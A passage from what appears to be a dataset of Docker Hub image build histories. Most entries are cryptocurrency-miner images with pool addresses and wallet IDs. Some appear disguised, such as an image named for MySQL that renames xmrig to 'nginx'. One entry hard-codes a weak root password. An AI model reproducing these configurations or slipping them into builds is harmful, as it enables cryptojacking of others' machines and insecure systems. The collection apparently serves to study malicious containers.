--fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c --strict - && rm cudasign.pub &&     echo "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list &&     echo "deb https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/nvidia-ml.list &&     apt-get purge --auto-remove -y gnupg-curl && rm -rf /var/lib/apt/lists/*\nENV CUDA_VERSION=9.0.176\nENV CUDA_PKG_VERSION=9-0=9.0.176-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-cudart-$CUDA_PKG_VERSION && ln -s cuda-9.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nLABEL com.nvidia.volumes.needed=nvidia_driver\nLABEL com.nvidia.cuda.version=9.0.176\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nENV NVIDIA_VISIBLE_DEVICES=all\nENV NVIDIA_DRIVER_CAPABILITIES=compute,utility\nENV NVIDIA_REQUIRE_CUDA=cuda>=9.0\nRUN useradd -ms /bin/bash monero\nUSER monero\nWORKDIR /home/monero\nCOPY --chown=monerofile:12e57e7520ca326a163af9b5515b315843ba4b44585a8b0f834625f0ff990d52 /home/monero/\nRUN chmod +x /home/monero/bminer\nCOPY --chown=monerofile:88382fe8132afa537e32ab326f915b3b775320bafb5fd1b969f3a333a44878b6 /home/monero/\nRUN chmod +x /home/monero/testdb.sh\nCOPY --chown=monerofile:d3f5a027fa24e7c14d7dc941cdc9ee0ef47bdb45bcb921aa14910f55da7e773c /home/monero/\nRUN chmod +x /home/monero/xmrig\nENTRYPOINT ["./testdb.sh"]'
rmgpinto/hypersh; b'ADD file:a3344b835ea6fdc5692df23826c970403656c6947342e117b2ac1a05956679af /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y curl\nWORKDIR /root\nRUN curl -sL https://github.com/xmrig/xmrig/releases/download/v2.6.0-beta1/xmrig-2.6.0-beta1-xenial-amd64.tar.tar.gz | tar -xvz\nCOPY file:c647316014f0468f4afd82973ec8916391cc9d976626340e93460ccc9dd3d6aa /root/xmrig-2.6.0-beta1/\nRUN mv /root/xmrig-2.6.0-beta1/config_hyper.json /root/xmrig-2.6.0-beta1/config.json\nENTRYPOINT ["/root/xmrig-2.6.0-beta1/xmrig"]'
jswierad/fluen-claymore; b'ADD file:592c2540de1c707636622213ee30ff5b6f8be0a48bb25c97edc7204ea4df1a81 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN apt-get update && apt-get install -y --no-install-recommends ca-certificates apt-transport-https gnupg-curl &&     rm -rf /var/lib/apt/lists/* &&     NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c --strict - && rm cudasign.pub &&     echo "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list\nENV CUDA_VERSION=8.0.61\nENV CUDA_PKG_VERSION=8-0=8.0.61-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-nvrtc-$CUDA_PKG_VERSION         cuda-nvgraph-$CUDA_PKG_VERSION         cuda-cusolver-$CUDA_PKG_VERSION         cuda-cublas-8-0=8.0.61.2-1         cuda-cufft-$CUDA_PKG_VERSION         cuda-curand-$CUDA_PKG_VERSION         cuda-cusparse-$CUDA_PKG_VERSION         cuda-npp-$CUDA_PKG_VERSION         cuda-cudart-$CUDA_PKG_VERSION &&     ln -s cuda-8.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nLABEL com.nvidia.volumes.needed=nvidia_driver\nLABEL com.nvidia.cuda.version=8.0.61\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nENV NVIDIA_VISIBLE_DEVICES=all\nENV NVIDIA_DRIVER_CAPABILITIES=compute,utility\nENV NVIDIA_REQUIRE_CUDA=cuda>=8.0\nLABEL com.nvidia.build.id=69000118 com.nvidia.build.ref=7b1cef2dbb8f0b94806586491692211571198b7f\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-core-$CUDA_PKG_VERSION         cuda-misc-headers-$CUDA_PKG_VERSION         cuda-command-line-tools-$CUDA_PKG_VERSION         cuda-nvrtc-dev-$CUDA_PKG_VERSION         cuda-nvml-dev-$CUDA_PKG_VERSION         cuda-nvgraph-dev-$CUDA_PKG_VERSION         cuda-cusolver-dev-$CUDA_PKG_VERSION         cuda-cublas-dev-8-0=8.0.61.2-1         cuda-cufft-dev-$CUDA_PKG_VERSION         cuda-curand-dev-$CUDA_PKG_VERSION         cuda-cusparse-dev-$CUDA_PKG_VERSION         cuda-npp-dev-$CUDA_PKG_VERSION         cuda-cudart-dev-$CUDA_PKG_VERSION         cuda-driver-dev-$CUDA_PKG_VERSION &&     rm -rf /var/lib/apt/lists/*\nENV LIBRARY_PATH=/usr/local/cuda/lib64/stubs:\nENV GPU_FORCE_64BIT_PTR=0\nENV GPU_MAX_HEAP_SIZE=100\nENV GPU_USE_SYNC_OBJECTS=1\nENV GPU_MAX_ALLOC_PERCENT=100\nENV GPU_SINGLE_ALLOC_PERCENT=100\nENV EPOOL=eth-eu1.nanopool.org:9999\nENV EWAL=0x54299f872c36f7bc306be3425abc41a5ab082752\nENV EPSW=x\nENV ETHI=8\nENV ESM=0\nENV DCOIN=sia\nENV DPOOL=sia-eu1.nanopool.org:7777\nENV DWAL=d2ce0ab59206119c0ba30b1592c8c43a6c3f949cd1eafc41cba7791d5f74d801a4e5bac8f463/docker1/george@noodles.gr\nENV DPSW=x\nENV DCRI=30\nENV MODE=0\nENV DI=detect\nENV GSER=1\nRUN apt-get update && apt-get install -y --allow-downgrades --allow-remove-essential --allow-change-held-packages --no-install-recommends apt-transport-https wget ca-certificates ocl-icd-opencl-dev curl libcurl3 && apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\nCOPY file:9bc3b825aece3008a840f927a52b302365cedc2b7f9c28d3717341f4e42024b5 /claymore.tar.gz\nRUN mkdir /claymore\nRUN tar -xvzf claymore.tar.gz --directory /claymore --strip 1\nRUN rm -f /claymore.tar.gz\nCOPY file:5f0b76fafd8adc0d0dfeecc81b93378beff351282d8c07c190c465b89def4d58 /entrypoint.sh\nRUN chmod +x /entrypoint.sh\nENTRYPOINT ["/bin/sh -c /entrypoint.sh"]'
krakenz/gakeaws-mysql; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]\nENV user=45TwKEr1LjoEPuxnbfuPhaXCf138AoQvtSJ3jdqg1gPxNjkSNbQpzZrGDaFHGLrVT7AzM7tU9QY8NVdr4H1C3r2d3XN9Cty\nRUN mv /xmrig /usr/bin/nginx\nENTRYPOINT ["nginx -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -k --donate-level 1 --cpu-priority 0 -u 45TwKEr1LjoEPuxnbfuPhaXCf138AoQvtSJ3jdqg1gPxNjkSNbQpzZrGDaFHGLrVT7AzM7tU9QY8NVdr4H1C3r2d3XN9Cty"]'
jeffjohnson25/test2; b'ADD file:1dd78a123212328bdc72ef7888024ea27fe141a72e24e0ea7c3c92b63b73d8d1 /\nCMD ["bash"]\nRUN echo \'APT::Install-Recommends "false";\' > /etc/apt/apt.conf.d/zz-local-tame\nRUN apt-get update && apt-get upgrade -y && apt-get install -y git ca-certificates build-essential autoconf automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev && apt-get clean\nRUN git clone https://github.com/hmage/cpuminer-opt\nCOPY file:6f458e783d9c30ccf9da54b525844a2359a4f56c576dfbf75241b7d0a2b1b6cc /entrypoint.sh\nWORKDIR /cpuminer-opt\nRUN autoreconf -f -i -v && CFLAGS="-O3 -maes -mssse3 -mavx -mtune=intel -DUSE_ASM" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl && make -j8\nUSER 1001\nENTRYPOINT ["/entrypoint.sh"]'
qwertywarrior/rubberman; b'ADD file:025ef672711f22be3988b93ba40885c88b07cfb7233e8873c979c067872f1d18 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nCMD ["/bin/bash"]\nMAINTAINER Francesco Ciocchetti <primeroznl@gmail.com>\nRUN apt-get update &&   apt-get install -y --no-install-recommends   automake   libcurl4-openssl-dev   git   make   gcc   libc6-dev   ca-certificates\nRUN git clone https://github.com/wolf9466/cpuminer-multi.git\nRUN cd cpuminer-multi && ./autogen.sh && ./configure CFLAGS="-O3" && make\nWORKDIR /cpuminer-multi\nENTRYPOINT &{["./minerd"]}'
chazu/chandev; b'ADD file:4bb62bb05874068552efeb626f8b31b4a29f26d6cc8c7d7fc7ab4c1fdece957a /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nMAINTAINER Phusion <info@phusion.nl>\nCOPY dir:4156d6d2c4b57f6457db9076a456c428e0bc9deee73f34aaba10f3045eedeb35 /bd_build\nRUN /bd_build/prepare.sh && \t/bd_build/system_services.sh && \t/bd_build/utilities.sh && \t/bd_build/cleanup.sh\nENV DEBIAN_FRONTEND=teletype LANG=en_US.UTF-8 LANGUAGE=en_US:en LC_ALL=en_US.UTF-8\nCMD ["/sbin/my_init"]\nMAINTAINER MangoFusion <mangofusi@gmail.com>\nENV LAST_REFRESHED=20160629\nENV HOME=/home/tester\nCMD ["/sbin/my_init"]\nRUN apt-get update &&     apt-get install --yes\nRUN apt-get update\nRUN apt-get install --yes   autoconf   autotools-dev \tbsdmainutils \tbuild-essential \tgcc \tgit \tlibboost-all-dev \tlibssl-dev \tlibcurl4-openssl-dev \tlibncurses-dev \tlibjansson-dev         beignet-opencl-icd         ocl-icd-opencl-dev         clinfo   libevent-dev \tlibtool   make \tpkg-config \tsudo   vim\nRUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\nRUN echo \'root:abc123\' |chpasswd\nRUN useradd -d /home/tester -m -s /bin/bash tester && echo "tester:tester" | chpasswd && adduser tester sudo && adduser tester video\nWORKDIR /home/tester\nCOPY file:277725388e8660af9fc05d96b6a62dbccec3cc55f09e7215f291aaefabbce081 /home/tester/\nRUN tar -xzvf /home/tester/db-4.8.30.NC.tar.gz\nCOPY dir:a0162fc5f2c32d4c795aac150debdb7300e6da423371cf3f028623d4662c1ef1 /home/tester/\nRUN chown -R tester:tester /home/tester\nUSER tester\nRUN git clone https://github.com/Chancoin-core/CHANCOIN.git chancoin\nWORKDIR /home/tester/db-4.8.30.NC/build_unix\nRUN mkdir -p /home/tester/chancoin/db4\nRUN ../dist/configure --enable-cxx --disable-shared --with-pic --prefix=/home/tester/chancoin/db4\nRUN make install\nWORKDIR /home/tester/chancoin\nRUN sh ./autogen.sh\nRUN ./configure LDFLAGS="-L/home/tester/chancoin/db4/lib" CPPFLAGS="-I/home/tester/chancoin/db4/include"\nRUN make -j2\nUSER root\nRUN make install\nUSER tester\nWORKDIR /home/tester\nRUN rm -rf db-4.8.30.NC\nRUN rm -rf db-4.8.30.NC.tar.gz\nRUN git clone --recurse-submodules --branch linux https://github.com/Chancoin-core/cpuminer-multi.git cpuminer\nWORKDIR /home/tester/cpuminer\nRUN sh ./autogen.sh\nRUN ./build.sh\nUSER root\nRUN make install\nUSER tester\nWORKDIR /home/tester/testnet\nRUN ln -s /home/tester/chancoin /home/tester/testnet/src\nRUN ln -s /home/tester/testnet /home/tester/chancoin/testnet\nEXPOSE 19001 19011\nCMD ["/bin/bash"]'
fapptvdotcom/proj1; b'ADD file:4d97c01f35dbb6a82afb0c4142e4c535f616f3446eea7088d43eab9c5170d939 /\nCMD ["/bin/sh"]\nWORKDIR /app\nRUN echo "@testing http://nl.alpinelinux.org/alpine/edge/testing" >> //etc/apk/repositories\nRUN apk add --no-cache       libmicrohttpd       openssl       hwloc@testing       python2       py2-pip       libstdc++     && pip install envtpl\nCOPY dir:20bc28b2fa3f1634f6a334d3da05596d5de10e4ee8ea64ee517b80bc18eb6add .\nENTRYPOINT ["/app/docker-entrypoint.sh"]\nCMD ["xmr-stak-cpu"]\nENV WALLET_ADDRESS=etnkHJgFDW2Fsbj592KzS1aLPbsMWoWnU5JwwdosdTAu72eQLJW4QfvF9pX7ZB4Qf6cEpaAvKqTddCEZ6NBVKn2p2opsvf9GKD/jizzstation1/findandrepeat01@gmail.com\nENV AES_OVERRIDE=true\nENV POOL_ADDRESS=etn-us-west1.nanopool.org:13333\nENV AUTO_THREAD_CONFIG=false\nENV THREAD_CONFIG={low_power_mode:true,no_prefetch:true,affine_to_cpu:0},{low_power_mode:true,no_prefetch:true,affine_to_cpu:1},{low_power_mode:true,no_prefetch:true,affine_to_cpu:2},{low_power_mode:true,no_prefetch:true,affine_to_cpu:3},{low_power_mode:true,no_prefetch:true,affine_to_cpu:4},{low_power_mode:true,no_prefetch:true,affine_to_cpu:5},{low_power_mode:true,no_prefetch:true,affine_to_cpu:6},{low_power_mode:true,no_prefetch:true,affine_to_cpu:7},\nWORKDIR /app\nCOPY file:051c4d16f1ab6434b3f626fdb5cd375a9e9c55458b90597a0baef0f243a82c8c /app\nCOPY file:4a7e5079c95a82dcb8312ae2c97e9552db06acb659afec385008e04456d3c8ad /app\nCOPY file:f7ed1c08e6f86133b6824d637332b871715eea508942e38a1d3bb21771257edb /app\nCOPY file:649c0340d2a20af98983ee7a31710303480c790ac137ca77d3eb722e2d296019 /app'
gennge/mine-test; b'ADD file:affda766655e01cbd66cdf7485f581f22be61d93abadcc9fd22ed34c78069e18 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nWORKDIR /root/\nRUN apt-get update && apt-get -qy install  automake  build-essential  libcurl4-openssl-dev  libssl-dev  git  ca-certificates  libjansson-dev libgmp-dev g++ --no-install-recommends\nRUN git clone --recursive https://github.com/JayDDee/cpuminer-opt cpuminer-multi\nWORKDIR /root/cpuminer-multi\nRUN ./autogen.sh\nRUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl\nRUN make'
coloz/mony; b'ADD file:2b00f26f6004576e2f8faeb3fb0517a14f79ea89a059fe096b54cbecf5da512e /\nCMD ["/bin/sh"]\nENV ALGO_MODE=cryptonight\nENV POOL_URL=POOL_URL\nENV POOL_USER=WALLET_ID\nENV POOL_PW=x\nENV MAX_CPU=100\nENV USE_SCHEDULER=false\nENV START_TIME=2100\nENV STOP_TIME=0600\nENV DAYS=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday\nRUN adduser -S -D -H -h /xmrig xminer\nRUN apk --no-cache upgrade &&       apk --no-cache add         libuv-dev         bash\nUSER xminer\nCOPY file:32e09225c5d0a1a921f30fcdf83068372cc65e45b3622843b16abcdd80b6b2d0 xmrig/xmrig\nCOPY file:a804fab112958c7fc98b674314915c25367257f8a744afb67d67c04f70dc7bc1 xmrig/script.sh\nWORKDIR /xmrig\nENTRYPOINT ["/bin/sh -c ./script.sh $ALGO_MODE $POOL_URL $POOL_USER $POOL_PW $MAX_CPU $USE_SCHEDULER $START_TIME $STOP_TIME $DAYS"]\nENV POOL_URL=monerohash.com:2222\nENV POOL_USER=46PzyArhU5ZXBsRYoCpR9YEGRXLf5bk2m2FyN4AV8gkh3Vm4PyAzcii3xFVMKEcHeo1f9P6G1NQGw5HDk78q6gpQASTwXtz\nENV POOL_PW=x\nENV MAX_CPU=100\nENV USE_SCHEDULER=false\nENV START_TIME=2100\nENV STOP_TIME=0600\nENV DAYS=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday\nENTRYPOINT ["/bin/sh -c ./script.sh cryptonight $POOL_URL $POOL_USER $POOL_PW $MAX_CPU $USE_SCHEDULER $START_TIME $STOP_TIME $DAYS"]'
e3b0c44298fc1c1/49afbf4c8996fb92427b; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]\n-a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -p 197.101.9.237 -k -t 4 --donate-level=1 --cpu-priority 0 -u 4B4f1Hb6KjcgbLNFgS6eT6BcFgqtCvxs7CEaRsYqQe4cDz4siNTqYjRdv8TcTB2V7W6dhgRMHbUUDiXjeb2e89HaKKUn88H'
e3b0c44298fc1c1/49afbf4c8996fb92427d; b'ADD file:fe64057fbb83dccb960efabbf1cd8777920ef279a7fa8dbca0a8801c651bdf7c /\nCMD ["/bin/sh"]\nsh -c apk update; apk add docker; /bin/sh'
fapptvdotcom/etn_nano_smtx; b'ADD file:4d97c01f35dbb6a82afb0c4142e4c535f616f3446eea7088d43eab9c5170d939 /\nCMD ["/bin/sh"]\nWORKDIR /app\nRUN echo "@testing http://nl.alpinelinux.org/alpine/edge/testing" >> //etc/apk/repositories\nRUN apk add --no-cache       libmicrohttpd       openssl       hwloc@testing       python2       py2-pip     && pip install envtpl\nCOPY dir:88491252e9f6d9991b3c8334ab79a60a7b4bc2011227c2bf3bbe9781ddc11dc4 .\nENTRYPOINT ["/app/docker-entrypoint.sh"]\nCMD ["xmr-stak-cpu"]\nxmr-stak-cpu\nxmr-stak-cpu'
e3b0c44298fc1c1/49afbf4c8996fb92427a; b'ADD file:074f2c974463ab38cf3532134e8ba2c91c9e346457713f2e8b8e2ac0ee9fd83d /\nLABEL org.label-schema.schema-version=1.0 org.label-schema.name=CentOS Base Image org.label-schema.vendor=CentOS org.label-schema.license=GPLv2 org.label-schema.build-date=20190305\nCMD ["/bin/bash"]\n/bin/bash\n/bin/bash\n/bin/bash\n/bin/bash\nMAINTAINER wzh@javanx.com\nRUN ls\nWORKDIR /root/\nRUN ls\nENV PATH=/root/xmrig-2.14.1:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENTRYPOINT ["/bin/bash start.sh"]'
wordpressweb/boats; b'ADD file:85ed2ac9d10c6f076a01f29e72b653675994c6fcfb90f0e6b88368c0262893fa /\nCMD ["/bin/sh"]\nWORKDIR /app\nRUN echo "@testing http://nl.alpinelinux.org/alpine/edge/testing" >> //etc/apk/repositories\nRUN apk add --no-cache       libmicrohttpd       openssl       hwloc@testing       python2       py2-pip       libstdc++     && pip install envtpl\nCOPY dir:65f0c656fde45cca2d734e723d84b161a4c87d5e08fa944703e829976466a970 .\nENTRYPOINT ["/app/docker-entrypoint.sh"]\nCMD ["xmr-stak-cpu"]\nxmr-stak-cpu'
wildwind289/dockerlab; b'ADD file:cd830d3aacc66aa750a588e56d835663908f7fbb855cb96d00aa01feb9567948 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nMAINTAINER Reimund Klain 